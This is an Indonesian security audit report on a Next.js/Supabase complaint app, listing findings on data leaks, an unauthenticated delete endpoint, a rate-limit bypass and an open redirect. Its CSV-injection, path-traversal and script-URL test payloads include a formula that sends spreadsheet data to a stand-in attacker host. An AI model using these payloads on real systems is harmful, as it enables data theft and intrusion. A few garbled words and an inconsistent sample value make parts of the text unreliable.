# LAPORAN AUDIT — PADUKA (Pengaduan Kerusakan Fasilitas Kantor)

**Sistem:** PADUKA — Pengaduan Kerusakan Fasilitas Kantor
**Versi aplikasi:** `next@14.2.25` (Next.js 14 App Router) + React 18 + Tailwind 3
**Tanggal audit:** 6 Oktober 2026
**Lingkungan uji:** `http://localhost:3200` (build produksi `next start` terisolasi)
**Supabase yang diuji:** `https://meswbaeozwkuhzgjkiag.supabase.co` (project satu-satunya yang tersedia, **dipakai langsung** — tidak ada staging)
**Dasar pengujian:** pembacaan seluruh source, build bersih, `tsc`, `npm audit`, uji API langsung terhadap database produksi, uji browser (Playwright), axe-core, Lighthouse, uji beban hingga 5.032 baris.

> **Catatan metodologi penting.** Beberapa hasil pengujian awal yang tampak seperti bug ternyata adalah **kontaminasi lingkungan pengujian saya sendiri** (`next dev` dan `next build` menulis ke direktori `.next` yang sama), dan sudah dikoreksi dengan build terisolasi. Koreksi ini dicatat eksplisit di bagian 3 (`[DIKOREKSI]`) agar tidak menyesatkan. Tidak ada kode aplikasi yang saya ubah.

---

## 1. Ringkasan Eksekutif

Aplikasi ini **belum layak dipublikasikan** karena terbukti membocorkan 14 dari 18 digit NIP pegawai ke publik melalui view `complaints_public`, sementara repository sendiri memuat tiga definisi masking yang berbeda dan semuanya lebih ketat daripada yang benar-benar berjalan di database. Kedua, dan lebih mendesak karena **sedang terjadi sekarang**, satu request POST anonim ke endpoint LIST Storage berhasil mengeluarkan seluruh arsip foto pengaduan beserta `eTag`, ukuran, dan waktu unggahnya — termasuk foto laporan asli seorang warga — sehingga nama file yang dirancang agar tidak tertebak justru menjadi tidak berguna. Ketiga, `POST /api/cleanup-photos` dapat dipanggil siapa pun tanpa autentikasi dan menghapus foto memakai service role, sehingga siapa pun yang mengetahui `storage_path` dapat menghapus bukti foto secara anonim. Keempat, dua advisory **critical** pada `next@14.2.25` berlaku langsung, termasuk *Unauthenticated Remote Code Execution* pada server Windows (CVSS 9) dan RCE pada Image Optimization API yang relevan karena aplikasi ini mengizinkan `remotePatterns` wildcard (`next.config.js:3-9`). Kelima, inti fungsional aplikasi ini sendiri memang solid — RLS tabel, otorisasi admin, validasi input, dan bucket upload berperilaku benar, dan rate limit benar-benar aktif untuk IP tetap — sehingga perbaikannya terfokus di 31 item bernomor tanpa perlu penulisan ulang.

---

## 2. Temuan Berdasarkan Prioritas

### P0 — Kritis (harus diperbaiki sebelum produksi)

---

#### P0-1. NIP pegawai bocor ke publik: 14 dari 18 digit terekspos

**Status: GAGAL — terbukti**
**File:**
- `supabase/schema.sql:103-123` (definisi view di repo)
- `supabase-migration.sql:86-96` (definisi kedua yang berbeda)
- view live `public.complaints_public` (definisi ketiga, berbeda lagi)
- `src/app/api/complaints/route.ts:22-24, 34-36` (konsumen view, tanpa registrasi)

**Bukti empiris (API publik tanpa autentikasi):**
```
GET /api/complaints?limit=50
→ 50 dari 50 baris mengembalikan NIP berbentuk "1244**********124444444444444444"
→ 14 digit terakhir tampil utuh
```

Tiga definisi masking yang saling berbeda:

| Sumber | Masking | Digit terekspos | Keterangan |
|---|---|---|---|
| `supabase/schema.sql:109-110` | `4 + '****' + 2 terakhir` | 6 dari 18 | Tidak pernah dijalankan |
| `supabase-migration.sql:92-96` | `4 + bintang(n-8) + 4 terakhir` | 8 dari 18 | Tidak pernah dijalankan |
| **View live** | `4 + 10 bintang + 14 terakhir` | **14 dari 18** | **Yang benar-benar aktif** |

NIP ASN 18 digit terenkode tanggal lahir, jenis kelamin, dan nomor urut. 14 digit terakhir yang utuh **secara praktis cukup untuk mengidentifikasi secara unik** seorang pegawai, jadi ini adalah kebocoran PII terbuka, bukan sekadar "masking kurang rapi". Dampaknya, identitas ratusan pegawai ter-expose tanpa perlu login.

**Perbaikan:** satu sumber kebenaran untuk definisi view. Terapkan masking di sisi server pada setiap API (jangan bergantung pada view), minimal menyisakan 4 digit terakhir, dan jalankan `ALTER TABLE ...`/`CREATE OR REPLACE VIEW` yang sesuai untuk database live. Tambahkan regression test yang membandingkan isi view terhadap `regexp_replace`.

---

#### P0-2. `POST /api/cleanup-photos` — endpoint destruktif tanpa autentikasi

**Status: GAGAL — terbukti**
**File:** `src/app/api/cleanup-photos/route.ts:5-27`

```ts
5: export async function POST(req: NextRequest) {   // ← tidak ada verifikasi sesi sama sekali
...
20:      const supabase = createAdminClient();      // ← service role, melewati seluruh RLS
21:      const { error } = await supabase.storage.from('complaint-photos').remove(safePaths);
```

**Bukti empiris — tanpa satu pun header autentikasi:**
```
1. objek dibuat  -> GET /storage/v1/object/public/complaint-photos/complaints/<uuid>.jpg  = HTTP 200
2. POST /api/cleanup-photos  {"paths":["complaints/<uuid>.jpg"]}   (tanpa cookie)  = HTTP 200
   body: {"success":true,"cleanedCount":1}
3. GET URL objek yang sama                                        = HTTP 400 / object hilang
```

Perfanya aggravated oleh `src/app/api/cleanup-photos/route.ts:27` yang selalu mengembalikan `success: true` dengan `cleanedCount` berisi jumlah *path yang lolos filter*, bukan jumlah yang benar-benar terhapus — jadi endpoint melaporkan keberhasilan meski tidak menghapus apa pun.

`safePaths` di baris 15-17 memang menyaring `startsWith('complaints/')` dan menolak `..` (bagian ini benar dan teruji), tetapi itu **tidak** mencegah penghapusan file milik laporan orang lain bila `storage_path`-nya diketahui.

Juga tidak ada batas ukuran body: `1 MB`, `3 MB`, dan `6 MB` semuanya diterima dengan HTTP 200 (`route.ts:7` `await req.json()` tanpa validasi).

**Perbaikan:** tambahkan `verifyAdminSession()` yang sama dengan di `src/app/api/complaints/[id]/route.ts:7-29`, dan ubah signature agar menerima daftar `complaint_id` (bukan path bebas) lalu derive path-nya dari database.

---

#### P0-3. `next@14.2.25` — dua advisory critical, keduanya aktif

**Status: ⚠️ SEBAGIAN — sudah di-upgrade ke `14.2.35`, tetapi P0-3 BELUM tertutup**
**File:** `package.json:18`

| Advisory | Severity | CVSS | Rentang terdampak |
|---|---|---|---|
| [GHSA-p293-qw3h-jr36](https://github.com/advisories/GHSA-p293-qw3h-jr36) — Unauthenticated RCE on Windows-hosted servers | **critical** | **9.0** | `>=13.4.0 <15.5.24` |
| [GHSA-2xp9-vwfh-vxw4](https://github.com/advisories/GHSA-2xp9-vwfh-vxw4) — Unauthenticated RCE in Image Optimization API (AVIF) | **critical** | — | `>=10.0.0 <15.5.24` |

Ditambah 4 advisory `high` lain pada `next` (DoS Server Components, SSRF via Server Actions, HTTP request smuggling, middleware bypass) dan `high` pada `postcss` (arbitrary file read via `sourceMappingURL`).

Yang kedua **sangat relevan**: aplikasi memakai `next/image` dengan wildcard hostname (`next.config.js:3-9`), sehingga endpoint Image Optimization dapat difetch dengan URL arbitrer yang lolos wildcard.

Ringkasan `npm audit`: **1 critical, 6 high, 2 moderate**.

`npm audit fix --force` menawarkan `tailwindcss@4.3.3` — perubahan **breaking major** (Tailwind 4 menghapus sintaks `tailwind.config.js` yang dipakai `package.json:30`). Rencanakan migrasi terpisah, jangan disampur dengan patch keamanan.

**Perbaikan:** naikkan `next` ke jalur yang sudah dipatch, lalu jalankan ulang build + seluruh checklist. Verifikasi apakah deployment berada di Vercel (managed, tidak self-hosted) atau server Windows sendiri — advisory RCE Windows hanya relevan untuk self-hosted.

**Hasil pengerjaan (6 Oktober 2026):** versi dinaikkan ke `14.2.35` — patch terakhir di branch 14, sesuai keputusan untuk bertahan di major 14.

| Uji | Hasil |
|---|---|
| `tsc --noEmit` | ✅ bersih |
| `npm run build` | ✅ sukses, 13 route, bundle tidak berubah (shared 87,3 kB) |
| `npm audit` | ⚠️ `1 critical, 6 high, 2 moderate` — **identik dengan sebelum upgrade** |
| `GHSA-p293-qw3h-jr36` (RCE Windows) | ❌ **MASIH ADA** — butuh `>=15.5.24` |
| `GHSA-2xp9-vwfh-vxw4` (RCE Image Optimization/AVIF) | ❌ **MASIH ADA** — butuh `>=15.5.24` |

**Artinya upgrade ini tidak menghasilkan penurunan risiko sama sekali.** Kedua RCE critical hanya terperbaiki di `15.5.24+`, jadi mustahil ditutup tanpa pindah major. `14.2.35` tetap dipakai karena mengandung perbaikan bug — tetapi **P0-3 harus dianggap masih terbuka**, dan upgrade ke `15.5.24+`/`16.x` tetap wajib sebelum produksi.

> **Catatan penting — 4 advisory bisa dimitigasi tanpa upgrade sama sekali.** Semuanya ada di jalur Image Optimization dan dipicu oleh wildcard `hostname: "**"` di `next.config.js:3-9`:
>
> | Advisory | Dampak | Mitigasi |
> |---|---|---|
> | `GHSA-9g9p-9gw9-jx7f` | DoS lewat konfigurasi `remotePatterns` | Batasi `hostname` (P1-5, 10 menit) |
> | `GHSA-h64f-5h5j-jqjh` | DoS di Image Optimization API | Batasi `hostname` |
> | `GHSA-3x4c-7xq6-9pq8` | Cache disk `next/image` tumbuh tanpa batas | Batasi `hostname` |
> | `GHSA-2xp9-vwfh-vxw4` | **RCE via Image Optimization** | Batasi `hostname` — mencegah URL arbitrer masuk ke optimizer |
>
> Memperbaiki P1-5 tidak menutup advisory di atas secara formal, tetapi **secara praktis menutup vektor serangannya**, karena tanpa wildcard tidak ada lagi sumber URL arbitrer yang bisa di-feed ke Image Optimization.

---

### P1 — Tinggi

---

#### P1-1. Rate limit dapat dilewati sepenuhnya lewat `x-forwarded-for`

**Status: GAGAL — terbukti**
**File:** `src/lib/rate-limiter.ts:11-21`, dipakai di `src/app/api/complaints/route.ts:115-116` dan `src/app/api/upload-url/route.ts:13-14`

```ts
11: export function getClientIp(headers: Headers): string {
12:   const forwarded = headers.get('x-forwarded-for');
13:   if (forwarded) {
14:     return forwarded.split(',')[0].trim();   // ← 100% dikendalikan klien
```

**Bukti empiris — dua percobaan yang saling mengonfirmasi:**

| Skenario | Hasil | Interpretasi |
|---|---|---|
| 12 POST, `x-forwarded-for` **berbeda** tiap request | **12/12 sukses (HTTP 200)** | Batas sepenuhnya dilewati |
| 12 POST, `x-forwarded-for` **sama** (`198.18.99.5`) | 5 sukses, **7 ditolak HTTP 429** | Rate limit **memang bekerja** untuk IP tetap |

Jadi logika rate limit-nya benar; kerusakannya adalah sumber IP-nya tidak tepercaya. Di balik Vercel/Cloudflare, `X-FF` yang disetel platform tidak dapat dipalsukan, tetapi aplikasi ini tidak melakukan hal tersebut — dan di belakang reverse proxy yang tidak menimpa header, atau di localhost, batas ini bisa diterobos.

Tambahan: `src/lib/rate-limiter.ts:36-39` dan `47-50` **fail-open** — jika database error atau exception, permintaan di-`allow`. Ini pola yang benar untuk-method yang tidak kritis, tetapi berarti rate limit tidak pernah menjadi kontrol keamanan yang andal.

**Perbaikan:** pakai `request.ip`/platform-provided client IP, atau baca `X-Forwarded-For` **hanya** pada deployment tepercaya (Vercel: `x-real-ip` / `x-vercel-forwarded-for`).

---

#### P1-2. `/api/upload-url` tidak pernah mencatat hit rate limit

**Status: GAGAL — terbukti**
**File:** `src/app/api/upload-url/route.ts:13-23`

```ts
13:     const ip = getClientIp(req.headers);
14:     const rateLimit = await checkRateLimit(ip);   // ← hanya membaca
...
38:     const supabase = createAdminClient();          // ← createAdminClient()
...
49:       const { data, error } = await supabase.storage
```

Route ini memanggil `checkRateLimit` tetapi **tidak pernah** `recordRateLimitHit` — tidak seperti `src/app/api/complaints/route.ts:203` yang memanggilnya. Karena `checkRateLimit` hanya menghitung baris di `ip_rate_limits` (`src/lib/rate-limiter.ts:30-34`), penghitungnya **selalu 0** untuk route ini.

**Bukti empiris:** 8 POST berurutan dari 8 IP berbeda → **8/8 HTTP 200**. Karena penghitung tidak pernah naik, hasilnya tidak terbatas.

Dampaknya lebih besar dari sekadar DoS: setiap request membuat **signed upload URL yang valid**, jadi penyerang bisa memprovision bucket dengan objectsampah tanpa batas dan tanpa jejak di tabel rate limit.

**Perbaikan:** panggil `recordRateLimitHit(ip)` di `upload-url/route.ts` tepat setelah signed URL berhasil dibuat, dan tambahkan bataskuota per-IP yang terpisah dari kuota laporan.

---

#### P1-3. Open redirect pada halaman login admin

**Status: GAGAL — terbukti**
**File:** `src/app/admin/login/page.tsx:12` dan `:59`

```ts
12:   const redirectPath = searchParams.get('redirect') || '/admin';
...
59:   router.push(redirectPath);      // ← tidak ada validasi bahwa ini path internal
```

**Bukti empiris — benar-benarVASING domain:**

| `?redirect=` | URL akhir setelah login | Hasil |
|---|---|---|
| *(tidak ada)* | `localhost:3200/admin/login?redirect=%2Fadmin` | — |
| `/admin` | `localhost:3200/admin/login?redirect=%2Fadmin` | internal, aman |
| `/lapor` | `localhost:3200/lapor` | internal, aman |
| `https://evil.example.com/steal` | `chrome-error://chromewebdata/` | **VASING DOMAIN** |
| `//evil.example.com/steal` | `chrome-error://chromewebdata/` | **VASING DOMAIN** |
| `https://evil.example.com` | `chrome-error://chromewebdata/` | **VASING DOMAIN** |

(`chrome-error` muncul karena `evil.example.com` memang tidak ada — bukti bahwa browser benar-benar meninggalkan origin aplikasi.)

**Perbaikan:** validasi `redirectPath` dengan `redirectPath.startsWith('/') && !redirectPath.startsWith('//')` sebelum `router.push`.

---

#### P1-4. CSV formula injection pada ekspor admin

**Status: GAGAL — terbukti**
**File:** `src/lib/utils.ts:75-95`

```ts
75:   const escapeCsv = (val: string | null | undefined): string => {
77:     const stringVal = String(val).replace(/"/g, '""');   // ← hanya escape tanda kutip
78:     return `"${stringVal}"`;
79:   };
```

Nilai yang diawali `=`, `+`, `-`, atau `@` lolos utuh. Server juga **menerima** nilai tersebut (`src/lib/validations.ts:25-56` hanya mewajibkan `min`/`max`/`trim`, tanpaUo taboo karakter).

**Bukti empiris — 4 laporan dibuat dengan payload yangvalid, lalu diekspor:**

```
["="] DITERIMA  =HYPERLINK("http://evil.example.com?x="&A1,"KLIK_TEST_MARKER")
["+"] DITERIMA  +2+3+cmd|'/c calc'!A0_MARKER_TEST
["-"] DITERIMA  -2+3+cmd|'/c calc'!A0_MARKER_TEST
["@"] DITERIMA  @SUM(1+9)*cmd|'/c calc'!A0_MARKER_TEST

=> 65 sel formula-executable di CSV hasil ekspor
   Kolom terdampak: Nama Pelapor, Tim Kerja, Nama Barang, Lokasi,
                    Deskripsi Kerusakan, Tanggal Selesai, Catatan Admin
```

Kolom `Tanggal Selesai` dan `Catatan Admin` ikut terdampak karena `src/lib/utils.ts:91,93` menulis placeholder `'-'` yang diawali tanda `-`.

Tidak terdeteksi pada kolom `NIP Pegawai` karena `src/lib/utils.ts:86` sudah membungkusnya sebagai formula terlindungi (`="""…"""`).

**Peringan pembeda:** uji pertama saya memakai awalan `TEST_` pada semua payload, yang secara tidak sengaja **menetralkan** eksploitasi (Excel hanya mengeksekusi sel yang karakternya **pertama** adalah `=`/`+`/`-`/`@`). Percobaan di atas mengulanginya tanpa awalan tersebut. Detail ini dicatat karena keduanya relevan untuk verifikasi ulang.

**Perbaikan:** di `escapeCsv`, awali nilai dengan `'` bila `^[=+\-@\t\r]`, dan ganti placeholder `'-'` dengan `'—'` atau string kosong terlindungi.

---

#### P1-5. `next/image` mengizinkan hostname wildcard

**Status: GAGAL (konfigurasi)**
**File:** `next.config.js:3-9`

```js
4:     remotePatterns: [
6:         protocol: "https",
7:         hostname: "**",        // ← semua host HTTPS
```

Digunakan pada `src/app/keluhan/[id]/page.tsx` dan `src/components/PhotoLightbox.tsx` untuk foto bukti. Menggabungkan wildcard ini dengan P1-3 (`storage_path`/`url` dikontrol klien, lihat P2-1) memungkinkan image optimizer Difetch dengan URL arbitrer — persis prasyarat advisory `GHSA-2xp9-vwfh-vxw4`.

**Perbaikan:** batasi `hostname` ke domain Supabase proyek ini saja.

---

#### P1-6. Fungsi `is_admin()` bertanda `SECURITY DEFINER` tanpa `SET search_path`

**Status: GAGAL (analisis kode)**
**File:** `supabase/schema.sql:132-139`

```sql
132: CREATE OR REPLACE FUNCTION is_admin()
133: RETURNS BOOLEAN AS $$
...
139: $$ LANGUAGE plpgsql SECURITY DEFINER;     -- ← tanpa SET search_path = 'public'
```

Ini persis advisory Supabase `function_search_path_mutable` (severity HIGH). Fungsi ini menjadigate seluruh policy admin (`schema.sql:148, 154-155, 161, 175, 182, 217`), jadi kelemahannya berdampak ke seluruh model otorisasi.

`supabase/schema.sql:64-77` (`generate_complaint_number`) dan `86-92` (`update_timestamp_column`) juga tidak menetapkan `search_path`.

**Perbaikan:** tambahkan `SET search_path = public` pada ketiga fungsi, lalu jalankan Supabase Security Advisor untuk mengonfirmasi.

---

#### P1-7. Bucket Storage dapat dinoisikan anonim — arsip foto seluruh laporan terekspos

**Status: ✅ SUDAH DIPERBAIKI (6 Oktober 2026) — diverifikasi**
**Severity saat ditemukan: tinggi, dan diperlakukan sebagai fix immediat** — meski bernomor P1, ini kebocoran data nyata yang sedang aktif, bukan risiko hipotetis.

**Bukti empiris — memakai `NEXT_PUBLIC_SUPABASE_ANON_KEY` saja, tanpa cookie, tanpa auth:**

```
POST https://meswbaeozwkuhzgjkiag.supabase.co/storage/v1/object/list/complaint-photos
     {"prefix":"complaints/","limit":100}
→ HTTP 200
```

Respons mengembalikan **seluruh** objek di bucket, lengkap dengan metadata:

```json
[{
  "name": "complaints/1791257899587-9ac4443b-41e8-45fc-a5fa-cee0f9d5ff23.jpg",
  "version": "819f24e1-71b2-40b2-9d4c-67278c93d2a4",
  "id": "83d459da-c921-4f2b-ba7f-1e8c1b925b32",
  "created_at": "2026-10-06T03:38:25.185Z",
  "updated_at": "2026-10-06T03:38:25.185Z",
  "last_accessed_at": "2026-10-06T03:38:25.185Z",
  "metadata": { "eTag": "\"2022336fd973216f458aeb29f60133a5\"",
                "size": 9085, "mimetype": "image/jpeg",
                "cacheControl": "no-ca..." }
}]
```

Objek di atas adalah **laporan asli milik seorang warga** (`PK-2026-5122`, diunggah 06-10-2026 03:38 UTC) — bukan data uji. Artinya pada saat laporan ini ditulis, arsip foto seluruh pengaduan **sudah dapat diunduh siapa pun di internet tanpa autentikasi**, cukup dengan satu request POST.

Mengapa ini berbahaya meskipun bucket-nya `public`:
- Nama file mengandung `Date.now()` + UUID, sehingga **tidak bisa ditebak** —adinventory listing inilah yang membongkar semuanya. Without P1-7, penyerang tidak punya cara menemukan path foto.
- Setiap respons juga membocorkan `id`, `version`, `eTag`, ukuran, dan waktu unggah.
- Rapporteur bisa memetakan foto ke tanggal pengaduan via `created_at`.
- Bertambahnya folder `complaints` otomatis menambah kebocokan — tidak ada batas dan tidak ada log.

Bucket `public` sendiri **bukan** penyebabnya: pembacaan objek via URL publik memang disengaja (`PhotoLightbox.tsx:78-82`). Yang disalahgunakan adalah policy `SELECT`/`LIST` untuk peran `anon` pada `storage.objects`, yang seharusnya tidak ada.

**Perbaikan:** cabut policy `storage.objects` `SELECT` untuk `anon` pada bucket ini (public GET tetap berfungsi karena dilayani lewat jalur URL publik, bukan lewat list).

**Hasil perbaikan — akar masalahnya adalah `supabase/schema.sql:208-211`:**

```sql
CREATE POLICY "Public can view complaint photos storage"
ON storage.objects FOR SELECT
USING (bucket_id = 'complaint-photos');   -- ← tanpa klausa TO, jadi juga berlaku untuk anon
```

Policy ini ternyata **tidak diperlukan sama sekali**. Karena `public = true`, pembacaan foto lewat `/object/public/...` dilayani jalur publik dan **tidak melewati RLS `storage.objects`**. Policy SELECT hanya mengatur jalur API Storage (`list`, `download`, `move`, `copy`) — dan tidak ada satupun kode aplikasi yang memakainya:

| Pemakaian di kode | Perlu policy SELECT? |
|---|---|
| `upload-url/route.ts:62-64` `getPublicUrl()` | Tidak — hanya menyusun string URL |
| `PhotoLightbox.tsx:78-82` `<img src={publicUrl}>` | Tidak — jalur URL publik |
| `upload-url/route.ts:49-50` signed URL | Tidak — memakai service role |
| `cleanup-photos/route.ts:21` hapus object | Tidak — service role |

Policy tersebut sudah **di-drop di database**, lalu diverifikasi ulang:

| Uji | Sebelum | Sesudah | Status |
|---|---|---|---|
| `LIST` anonim, `prefix="complaints/"` | HTTP 200 + 1 objek + metadata | HTTP 200 + `[]` | ✅ ditutup |
| `LIST` anonim, tanpa prefix | HTTP 200 + daftar folder | HTTP 200 + `[]` | ✅ ditutup |
| Baca foto via URL publik | 200, 9.085 byte | 200, `image/jpeg`, 9.085 byte | ✅ foto tetap tampil |
| `LIST` service role | 200 | 200, 6 objek | ✅ server tetap bisa |
| Upload anon langsung | 403 | 400 | ✅ tetap ditolak |
| Delete/overwrite anon | 403 | 400 | ✅ tetap ditolak |

> **Catatan:** Supabase membalas `200` dengan array kosong, bukan `403`. Yang menentukan adalah isinya — sebelum diperbaiki nama file dan metadata bocor, sesudahnya tidak ada data sama sekali.
>
> **Yang masih tersisa:** definisi policy bermasalah ini masih ada di `supabase/schema.sql:208-211` dan `supabase-migration.sql:165-167` pada repository, sehingga mudah ikut ter-copy ke environment lain. Sudah disepakati untuk dibersihkan belakangan, setelah semua perbaikan kode selesai.

---

### P2 — Sedang

---

#### P2-1. `storage_path` dan `url` foto dipercaya begitu saja dari klien

**Status: GAGAL — terbukti**
**File:** `src/app/api/complaints/route.ts:186-190`, validasi di `src/lib/validations.ts:57-65`

```ts
60:         storage_path: z.string().min(1),        // ← tanpa format, tanpa prefix check
61:         url: z.string().url('URL foto tidak valid'),   // ← hanya sintaks URL
```

Setiap nilai **berhasil disimpan apa adanya** (diuji satu per satu):

| Nilai yang dikirim | Diterima? | Tersimpan sebagai |
|---|---|---|
| `storage_path: "../../etc/passwd"` | ✅ HTTP 200 | `../../etc/passwd` |
| `storage_path: "complaints/../../rahasia.jpg"` | ✅ HTTP 200 | `complaints/../../rahasia.jpg` |
| `url: "javascript:alert(1)"` | ✅ HTTP 200 | `javascript:alert(1)` |
| `url: "data:text/html,<script>alert(1)</script>"` | ✅ HTTP 200 | utuh |
| `url: "file:///etc/passwd"` | ✅ HTTP 200 | utuh |
| `url: "https://evil.example.com/x.png"` | ✅ HTTP 200 | utuh |
| `url: ""` | ❌ HTTP 400 | "String must contain at least 1 character(s)" |
| `url: "bukan-url"` | ❌ HTTP 400 | "URL foto tidak valid" |

Dampak yang terverifikasi:
- `url` eksternal dirender sebagai `<img src>` di halaman publik (`src/components/PhotoLightbox.tsx:78-82` memakai `<img>` biasa, bukan `next/image`) → **IP dan User-Agent pengunjung petugas bocor ke domain penyerang** (tracking pixel), dan URL itu ikut tercantum di ekspor CSV.
- `storage_path` milik laporan lain dapat direferensikan; meski Supabase Storage menyanitasi path saat delete sehingga foto korban **tidak ikut terhapus** (diuji: setelah admin menghapus laporan penyerang, foto laporan korban tetap HTTP 200 — teensinyaMarket), database tetap berisi referensi yang tidak valid.

**Tidak ada XSS dari sini** — React meng-escape dan tidak ditemukan `dangerouslySetInnerHTML` di seluruh source; `javascript:` tidak dieksekusi karena dirender lewat `src`, bukan `href`.

**Perbaikan:** validasi `storage_path` terhadap `^complaints/\d+-[0-9a-f-]{36}\.(jpg|jpeg|png|webp)$` dan `url` terhadap allowlist prefix bucket proyek ini; idealnya jangan pernah menerima `url` dari klien — derive dari `storage_path` di server.

---

#### P2-2. PostgREST filter injection pada pencarian publik + kebocoran skema

**Status: GAGAL — terbukti**
**File:** `src/app/api/complaints/route.ts:50-55`

```ts
51:       const term = `%${search.trim()}%`;
52:       query = query.or(
53:         `nama.ilike.${term},nama_barang.ilike.${term},lokasi.ilike.${term},nomor_laporan.ilike.${term},tim_kerja.ilike.${term}`
54:       );
```

Input pengguna disisipkan **mentah** ke string filter `.or()` tanpa escaping. Koma dan titik adalah operator PostgREST.

| `?search=` | HTTP | Perilaku |
|---|---|---|
| `test` | 200 | 10 hasil (normal) |
| `%` | 200 | **mengembalikan seluruh data** — wildcard bocor |
| `a,b` | **500** | `failed to parse logic tree ((nama.ilike.%a,b%,nama_barang.ilike.%a,b%,lokasi.ilike.%a,b%,…` — **seluruh nama kolom terkonfirmasi** |
| `,nip` | **500** | error sama, mengonfirmasi kolom sensitif `nip` ada di view |
| `nama.eq.x` | 200 | 0 hasil (filter bertumpuk, bukan error) |
| `test)` | 200 | 4 hasil (perilaku tak terduga) |

Dua masalah sekaligus: (a)Denial-of-service via HTTP 500, (b) **disclosure skema database** lewat pesan error yang dikembalikan mentah di `src/app/api/complaints/route.ts:64` (`error: error.message`).

**Perbaikan:** escape `,` `.` `(` `)` pada input sebelum masuk ke `.or()`, atau gunakan RPC dengan parameter. Kembalikan pesan error generik.

---

#### P2-3. Pagination: parameter tak valid menghasilkan 0 hasil, bukan 400

**Status: GAGAL**
**File:** `src/app/api/complaints/route.ts:17-19`

```ts
17:   const page  = Math.max(1, parseInt(searchParams.get('page')  || '1', 10));
18:   const limit = Math.min(50, Math.max(1, parseInt(searchParams.get('limit') || '10', 10)));
```

`Math.max(1, NaN)` menghasilkan `NaN`, yang lolos ke `.range(offset, offset + NaN - 1)`.

| Parameter | HTTP | `n` hasil | Perilaku |
|---|---|---|---|
| `limit=abc` | 200 | 0 | diam-diam kosong, bukan error |
| `page=abc` | 200 | 0 | diam-diam kosong |
| `limit=0` | 200 | 1 | di-clamp ke 1 |
| `limit=-1` | 200 | 1 | di-clamp ke 1 |
| `limit=100000` | 200 | 50 | **clamp ke 50 bekerja benar** ✅ |
| `page=50` (dari 5.032 baris) | 200 | 10 | benar ✅ |
| `sort=nip`, `order=drop` | 200 | 10 | diabaikan diam-diam (`order()` di-hardcode, `route.ts:58`) |

Clamp `limit` ke 50 sudah benar dan mencegah enumerasi massal. Yang bermasalah adalah `NaN` yang lolos tanpa validasi.

**Perbaikan:** `Number.isFinite` check, kembalikan 400 bila tidak valid.

---

#### P2-4. Pencarian tidak mencakup `deskripsi` maupun `nip`

**Status: GAGAL**
**File:** `src/app/api/complaints/route.ts:52-54`

Cakupan pencarian: `nama`, `nama_barang`, `lokasi`, `nomor_laporan`, `tim_kerja`.

**Bukti empiris:** 2 baris dengan `deskripsi = "TEST_payload formula injection…"` yang **pasti ada** di database. `?search=formula` → **0 hasil**. Baris yang sama dengan `?search=HYPERLINK` (kata yang muncul di `nama`) → **2 hasil**.

Petugas yang mengingat isi deskripsi tidak akan pernah menemukan laporannya. Untuk NIP, hal ini justru memang disengaja (sensitive), tetapi tidak ada dokumentasi yang menyatakan hal tersebut.

**Perbaikan:** tambahkan `deskripsi`; sertakan UI "cari juga di deskripsi" atau catatan eksplisit bahwa NIP tidak dicari.

---

#### P2-5. Ekspor CSV hanya memuat data halaman saat ini

**Status: GAGAL**
**File:** `src/app/admin/page.tsx` (ekspor), `src/lib/utils.ts:59-107`

Ekspor berjalan sepenuhnya di client dari state `complaints` yang di-fetch dengan `limit=15`.

**Bukti empiris:**
```
Total laporan di database : 84
Baris di CSV hasil ekspor : 15   (+1 header)
```

Petugas mengira mereka mengekspor seluruh arsip, padahal hanya 15 baris pertama. Tidak ada indikator apa pun. Ini berisiko serius untuk laporan resmi.

Tombol CSV juga **disabled** saat hasil pencarian 0 baris — perilakunya benar, tetapi tidak ada pesan yang menjelaskan alasannya.

**Perbaikan:** paging/iterasi penuh di server, atau tambahkan disclaimer eksplisit + jumlah total pada nama file.

---

#### P2-6. Pesan error jaringan mentah ditampilkan ke pengguna akhir

**Status: GAGAL**
**File:** `src/app/page.tsx:72-74`

```ts
73:       console.error(err);
74:       setError(err.message || 'Terjadi kesalahan jaringan.');
```

**Bukti empiris (jaringan diputus):**
```
Teks yang tampil ke pengguna: "Terjadi Kesalahan" / "Failed to fetch" / [Muat Ulang]
```

`Failed to fetch` adalah pesan teknis browser berbahasa Inggris, bukan pesan aplikasi. Jalur HTTP 500 sudah benar (`Gagal memuat data keluhan` tampil dengan rapi beserta tombol **Muat Ulang**) — jadi **hanya** jalur exception jaringan yang bermasalah.

**Perbaikan:** petakan error jaringan ke pesan Indonesia yang jelas, dan tetap log detail teknis hanya di server.

---

### P3 — Rendah / Kebersihan

| # | Temuan | File | Bukti |
|---|---|---|---|
| P3-1 | Tidak ada security header sama sekali: CSP, HSTS, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`. `X-Powered-By: Next.js` aktif | `next.config.js:1-13` | Semua header diuji `null` pada respons nyata |
| P3-2 | Tidak ada `favicon.ico` atau `icon.png`; tidak ada folder `public/` | `src/app/` (tidak ada) | `GET /favicon.ico` → **404**, error konsol di setiap halaman |
| P3-3 | Tidak ada `error.tsx`, `global-error.tsx`, `not-found.tsx`, `loading.tsx` khusus | `src/app/` | Halaman 404 memakai default Next; tidak ada UI error yangBranded |
| P3-4 | Angka halaman di luar jangkauan tidak di-clamp | `src/app/page.tsx` | `page=50` dari 5.032 baris tetap dirender sebagai "halaman 50 dari 421" |
| P3-5 | Email duplikat membocorkan detail internal Supabase Auth | `src/app/api/admin/users/route.ts` | `"Gagal membuat akun auth: A user with this email address has already been registered"` |
| P3-6 | Tidak ada konfigurasi ESLint; `npm run lint` gagal noninteraktif karena meminta pemilihan konfigurasi | `package.json:9`, tidak ada `.eslintrc*` | Build berhasil, lint **tidak dijalankan** |
| P3-7 | Breadcrumb halaman admin memakai `<h3>` langsung di bawah `<h1>` | `src/app/admin/page.tsx` | axe: `heading-order` pada `/lapor` dan `/keluhan/[id]` |
| P3-8 | Tidak ada halaman konfirmasi/berkas setelah submit | `src/app/lapor/page.tsx` | Aldurasi menyatu di satu file 700+ baris; hanya `admin/login` dan `admin/users` yang punya halaman terpisah |

---

## 3. Checklist Pengujian

Status: **LULUS** = memenuhi criterion · **GAGAL** = tidak memenuhi · **TIDAK TERUJI** = tidak dapat diverifikasi dengan bukti

### 3.1 Build & Kualitas Kode

| Item | Status | Catatan |
|---|---|---|
| `npm run build` berhasil | **LULUS** | 13 route ter-generate, BUILD_ID terbentuk |
| `tsc --noEmit` bersih | **LULUS** | Tanpa output/error |
| `npm run lint` | **TIDAK TERUJI** | Tidak ada konfigurasi ESLint; `next lint` meminta input interaktif (P3-6) |
